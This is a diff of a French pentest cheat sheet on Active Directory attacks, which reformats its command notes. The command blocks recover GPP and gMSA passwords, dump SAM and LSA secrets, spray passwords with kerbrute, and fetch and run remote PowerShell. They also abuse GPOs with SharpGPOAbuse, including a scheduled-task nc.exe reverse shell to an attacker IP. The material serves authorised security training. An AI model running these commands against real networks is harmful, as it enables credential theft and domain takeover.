@@ -1461,28 +1423,22 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `Impacket-Get-GPPPassword` · `Get-GPPPassword.py`  
 
 
-Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-gpppassword.py.</p>
 
 ```bash
 Get-GPPPassword.py -no-pass '[DOMAIN_CONTROLLER]'
 ```
 
 
-Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».
-
 ```bash
 Get-GPPPassword.py '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
 ```
 
 
-Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».
-
 ```bash
 Get-GPPPassword.py -hashes :'[NThash]' '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
 ```
 
-
-Commande `get-gpppassword.py` pour la rubrique « Impacket-Get-GPPPassword ».
 
 ```bash
 Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
@@ -1494,7 +1450,7 @@ Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
 Examiner les objets, les droits et les services du domaine.
 
 
-Commande `https` pour la rubrique « SMB Share-SYSVOL ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil https.</p>
 
 ```bash
 # Reference to a script for downloading files in SYSVOL
@@ -1506,7 +1462,7 @@ https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords
 `cpassword`  
 
 
-Rechercher ou filtrer des données.
+<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
 
 ```bash
 grep -inr "cpassword"
@@ -1516,14 +1472,12 @@ grep -inr "cpassword"
 ### CrackMapExec
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
@@ -1535,7 +1489,7 @@ crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp
 Vérifier les ports et les services de la cible autorisée.
 
 
-Commande `powershell` pour la rubrique « Importing the Module ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil powershell.</p>
 
 ```powershell
 powershell -ExecutionPolicy Bypass
@@ -1558,21 +1512,19 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 `Invoke-adPEAS`  
 
 
-Commande `invoke-adpeas` pour la rubrique « De base Usage ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil invoke-adpeas.</p>
 
 ```powershell
 Invoke-adPEAS -Domain '[domain].com' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor
 ```
 
 
-Commande `invoke-adpeas` pour la rubrique « De base Usage ».
-
 ```powershell
 Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com'
 ```
 
 
-Exemple technique pour la rubrique « De base Usage ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « De base Usage ».</p>
 
 ```powershell
 $SecPassword = ConvertTo-SecureString '[password]' -AsPlainText -Force
@@ -1581,7 +1533,7 @@ Invoke-adPEAS -Domain '[domain].com' -Cred $Cred
 ```
 
 
-Commande `invoke-adpeas` pour la rubrique « De base Usage ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil invoke-adpeas.</p>
 
 ```powershell
 Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[domain]\[userName]' -Password '[password]' -Force
@@ -1591,70 +1543,52 @@ Invoke-adPEAS -Domain '[domain].com' -Server 'dc1.[domain].com' -Username '[doma
 ### Module-Specific Usage
 
 
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil invoke-adpeas.</p>
 
 ```powershell
 Invoke-adPEAS -Module Domain
 ```
 
 
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
-
 ```powershell
 Invoke-adPEAS -Module Rights
 ```
 
-
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
 
 ```powershell
 Invoke-adPEAS -Module GPO
 ```
 
 
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
-
 ```powershell
 Invoke-adPEAS -Module ADCS
 ```
 
-
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
 
 ```powershell
 Invoke-adPEAS -Module Creds
 ```
 
 
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
-
 ```powershell
 Invoke-adPEAS -Module Delegation
 ```
 
-
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
 
 ```powershell
 Invoke-adPEAS -Module Accounts
 ```
 
 
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
-
 ```powershell
 Invoke-adPEAS -Module Computer
 ```
 
 
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
-
 ```powershell
 Invoke-adPEAS -Module Bloodhound
 ```
 
-
-Commande `invoke-adpeas` pour la rubrique « Module-Specific Usage ».
 
 ```powershell
 Invoke-adPEAS -Module Bloodhound -Scope All
@@ -1668,7 +1602,7 @@ Invoke-adPEAS -Module Bloodhound -Scope All
 `Get-ADServiceAccount` · `msDS-ManagedPassword`  
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} -Properties *
@@ -1679,7 +1613,7 @@ Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 `Get-ADServiceAccount`  
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties *
@@ -1699,7 +1633,7 @@ Examiner les objets, les droits et les services du domaine.
 `SharpHound`  
 
 
-Commande `sharphound.exe` pour la rubrique « Automated Découverte with BloodHound ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sharphound.exe.</p>
 
 ```powershell
 SharpHound.exe -c All
@@ -1710,7 +1644,7 @@ SharpHound.exe -c All
 `ReadProperty` · `msDS-ManagedPassword`  
 
 
-Rechercher ou filtrer des données.
+<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
 
 ```text
 Find Principals with Unusual Rights on Password Attributes
@@ -1733,7 +1667,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `GMSAPasswordReader.exe`  
 
 
-Commande `.` pour la rubrique « Usage ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
 
 ```powershell
 .\GMSAPasswordReader.exe --AccountName [GMSA_ACCOUNT_NAME]
@@ -1758,7 +1692,7 @@ Commande `.` pour la rubrique « Usage ».
 `GMSAPasswordReader.exe` · `msDS-ManagedPassword`  
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 # Find all gMSA accounts
@@ -1770,7 +1704,7 @@ Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 `Get-ADObject` · `Get-ADServiceAccount` · `msDS-ManagedPassword`  
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADObject -Filter 'ObjectClass -eq "msDS-GroupManagedServiceAccount"' -Properties msDS-ManagedPassword
@@ -1781,7 +1715,7 @@ Get-ADObject -Filter 'ObjectClass -eq "msDS-GroupManagedServiceAccount"' -Proper
 `Get-ADAttributeEditor` · `msDS-ManagedPassword`  
 
 
-Interroger les objets de l'annuaire LDAP.
+<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
 ```bash
 ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>" -b "DC=domain,DC=com" "(objectClass=msDS-GroupManagedServiceAccount)" msDS-ManagedPassword
@@ -1792,7 +1726,7 @@ ldapsearch -x -H ldap://<domain_controller> -D "<user>@<domain>" -w "<password>"
 `Get-DomainGMSA` · `msDS-ManagedPassword`  
 
 
-Commande `get-domaingmsa` pour la rubrique « Alternative Commandes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-domaingmsa.</p>
 
 ```powershell
 # List gMSA accounts with PowerView
@@ -1805,7 +1739,7 @@ Get-DomainGMSA -Properties msDS-ManagedPassword
 Examiner les objets, les droits et les services du domaine.
 
 
-Commande `powershell` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil powershell.</p>
 
 ```powershell
 powershell -ExecutionPolicy bypass
@@ -1813,14 +1747,14 @@ Import-Module ./PowerView.ps1
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-NetGPO | select displayname
 ```
 
 
-Commande `get-domainobjectacl` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-domainobjectacl.</p>
 
 ```powershell
 Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
@@ -1831,28 +1765,26 @@ Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($
 `WriteGPO` · `OwnsGPO`  
 
 
-Commande `gpo` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil gpo.</p>
 
 ```text
 GPO control
 ```
 
 
-Commande `get-gpo` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-gpo.</p>
 
 ```powershell
 Get-GPO -Name "[DisplayName]"
 ```
 
 
-Commande `get-gpo` pour la rubrique « Group Policy Object (GPO) Abuse ».
-
 ```powershell
 Get-GPO -Guid [gpo_id]
 ```
 
 
-Commande `get-gppermission` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil get-gppermission.</p>
 
 ```powershell
 Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
@@ -1863,21 +1795,21 @@ Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
 `SharpGPOAbuse`  
 
 
-Commande `./sharpgpoabuse.exe` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ./sharpgpoabuse.exe.</p>
 
 ```powershell
 ./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "[current_user]" --Command "cmd.exe" --Arguments "/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe" --GPOName "[GPO_to_abuse]"
 ```
 
 
-Commande `.` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
 
 ```powershell
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "[GPO_to_abuse]"
 ```
 
 
-Commande `gpupdate` pour la rubrique « Group Policy Object (GPO) Abuse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil gpupdate.</p>
 
 ```powershell
 gpupdate /force
@@ -1894,28 +1826,22 @@ Examiner les objets, les droits et les services du domaine.
 Examiner les permissions et la configuration de Linux.
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 enum4linux -U <DOMAIN_IP>
 ```
 
 
-Énumérer les informations SMB ou RPC.
-
 ```bash
 enum4linux -a <DOMAIN_IP>
 ```
 
 
-Énumérer les informations SMB ou RPC.
-
 ```bash
 enum4linux -u <VALID_USERNAME> -p <VALID_PASSWORD> <DOMAIN_IP>
 ```
 
-
-Énumérer les informations SMB ou RPC.
 
 ```bash
 enum4linux -a <DOMAIN_IP> > domain_enum.txt
@@ -1925,35 +1851,27 @@ enum4linux -a <DOMAIN_IP> > domain_enum.txt
 ### Using CrackMapExec
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --shares
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --gpp-password
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --sam
 ```
 
 
-Examiner le service distant avec les paramètres fournis.
-
 ```bash
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --lsa
 ```
 
-
-Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ldap <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --users
@@ -1965,28 +1883,22 @@ crackmapexec ldap <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain
 Examiner les objets, les droits et les services du domaine.
 
 
-Interroger les objets de l'annuaire LDAP.
+<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
 ```bash
 ldapsearch -x -h <DOMAIN_IP> -s base
 ```
 
 
-Interroger les objets de l'annuaire LDAP.
-
 ```bash
 ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
 ```
 
 
-Interroger les objets de l'annuaire LDAP.
-
 ```bash
 ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=computer)" name
 ```
 
-
-Interroger les objets de l'annuaire LDAP.
 
 ```bash
 ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local"
@@ -1996,35 +1908,27 @@ ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWO
 ### Using Rpcclient
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 rpcclient -U <VALID_USERNAME>%<VALID_PASSWORD> <DOMAIN_IP>
 ```
 
 
-Énumérer les informations SMB ou RPC.
-
 ```bash
 rpcclient $> enumdomusers
 ```
 
-
-Énumérer les informations SMB ou RPC.
 
 ```bash
 rpcclient $> enumdomgroups
 ```
 
 
-Énumérer les informations SMB ou RPC.
-
 ```bash
 rpcclient $> netshareenum
 ```
 
-
-Énumérer les informations SMB ou RPC.
 
 ```bash
 rpcclient $> querydominfo
@@ -2036,21 +1940,17 @@ rpcclient $> querydominfo
 Examiner les objets, les droits et les services du domaine.
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 smbclient -L //<DOMAIN_IP> -U <VALID_USERNAME>%<VALID_PASSWORD>
 ```
 
 
-Énumérer les informations SMB ou RPC.
-
 ```bash
 smbclient //<DOMAIN_IP>/NETLOGON -U <VALID_USERNAME>%<VALID_PASSWORD>
 ```
 
-
-Énumérer les informations SMB ou RPC.
 
 ```bash
 smbclient //<DOMAIN_IP>/SYSVOL -U <VALID_USERNAME>%<VALID_PASSWORD> -c "get important_file.txt"
@@ -2066,7 +1966,7 @@ Examiner les objets, les droits et les services du domaine.
 `SharpHound`  
 
 
-Commande `sharphound.exe` pour la rubrique « Using BloodHound (SharpHound) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sharphound.exe.</p>
 
 ```bash
 SharpHound.exe -c All -d [domain].com -u <VALID_USERNAME> -p <VALID_PASSWORD> -dc <DOMAIN_IP>
@@ -2078,21 +1978,19 @@ SharpHound.exe -c All -d [domain].com -u <VALID_USERNAME> -p <VALID_PASSWORD> -d
 Vérifier les ports et les services de la cible autorisée.
 
 
-Identifier les versions des services.
+<p class="oscp-command-note">Identifier les versions des services.</p>
 
 ```bash
 nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn <DOMAIN_IP>
 ```
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap --script smb-enum-shares,smb-enum-users -p445 <DOMAIN_IP>
 ```
 
-
-Examiner le service avec les scripts NSE sélectionnés.
 
 ```bash
 nmap --script ldap-search -p389 <DOMAIN_IP>
@@ -2102,15 +2000,13 @@ nmap --script ldap-search -p389 <DOMAIN_IP>
 ### Using Kerbrute
 
 
-Commande `kerbrute` pour la rubrique « Using Kerbrute ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil kerbrute.</p>
 
 ```bash
 # A good wordlist of usernames is /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
 kerbrute userenum --dc <DOMAIN_IP> -d [domain].com userlist.txt
 ```
 
-
-Commande `kerbrute` pour la rubrique « Using Kerbrute ».
 
 ```bash
 kerbrute passwordspray --dc <DOMAIN_IP> -d [domain].com userlist.txt <PASSWORD>
@@ -2122,14 +2018,12 @@ kerbrute passwordspray --dc <DOMAIN_IP> -d [domain].com userlist.txt <PASSWORD>
 Observer les permissions et la configuration de Windows.
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADUser -Filter * -Property * | Select-Object Name, SamAccountName, EmailAddress
 ```
 
-
-Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 Get-ADGroup -Filter * | Select-Object Name, GroupScope
@@ -2139,7 +2033,7 @@ Get-ADGroup -Filter * | Select-Object Name, GroupScope
 ### Tips for CrackMapExec Énumération
 
 
-Examiner le service avec les scripts NSE sélectionnés.
+<p class="oscp-command-note">Examiner le service avec les scripts NSE sélectionnés.</p>
 
 ```bash
 nmap -p 445 --script smb-os-discovery <IP_RANGE>
@@ -2150,7 +2044,7 @@ nmap -p 445 --script smb-os-discovery <IP_RANGE>
 `--local-auth` (authentification locale)  
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares --users
@@ -2161,7 +2055,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares --users
 `smbclient`  
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 smbclient //<DOMAIN_IP>/<SHARE> -U <USERNAME>
@@ -2171,7 +2065,7 @@ smbclient //<DOMAIN_IP>/<SHARE> -U <USERNAME>
 ### Énumération des utilisateurs
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # Enumerate valid users and their privileges
@@ -2191,7 +2085,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAM
 ### Shares Énumération
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # Enumerate accessible shares with provided credentials
@@ -2208,7 +2102,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NA
 ### Group Énumération
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # List groups in the domain
@@ -2222,7 +2116,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NA
 ### Politique de mots de passe Énumération
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # Check domain password policies
@@ -2233,7 +2127,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_N
 ### Local Accounts Énumération
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # List users and shares on a local machine
@@ -2246,7 +2140,7 @@ crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --users --shares --local-auth
 Examiner les objets, les droits et les services du domaine.
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # Dump domain users
@@ -2262,7 +2156,7 @@ crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-Examiner le service distant avec les paramètres fournis.
+<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
 
 ```bash
 # List databases
